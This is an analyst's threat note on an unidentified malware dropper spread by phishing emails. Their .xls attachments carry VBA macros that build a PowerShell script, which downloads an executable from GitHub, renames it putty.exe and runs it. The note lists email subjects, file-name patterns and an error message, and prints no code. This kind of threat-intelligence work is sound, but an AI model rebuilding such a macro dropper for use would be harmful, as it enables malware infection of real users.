THREAT IDENTIFICATION:  UNKNOWN DROPPER

ANALYST NOTES
The emails all had similar subjects - all started with either "Funds transfer act" or "Transaction act".
The spreadsheets that I looked at had a single sheet (no hidden sheets) with the title "Лист1".
All emails had an attached .xls file named either "transfer_info<4 or 5 digits>" or "recip_conf_<4 or 5 digits>".
The .xls files contained VBA macros that build and execute a Powershell script.
The script tries to download an .exe from GitHub and rename it as "putty[.]exe" before launching it.
In one case, the VBA macros seemed clearly broken - I received an error MsgBox that read:
	C:\Users\analyst\Documents\samples\open.vbs
	"An error occurred in the secure channel support"
	Code: 80072F7D
	WinHttp.WinHttpRequest
I tried to manually download the payload from the url I captured from the Powershell script but it returned 404.
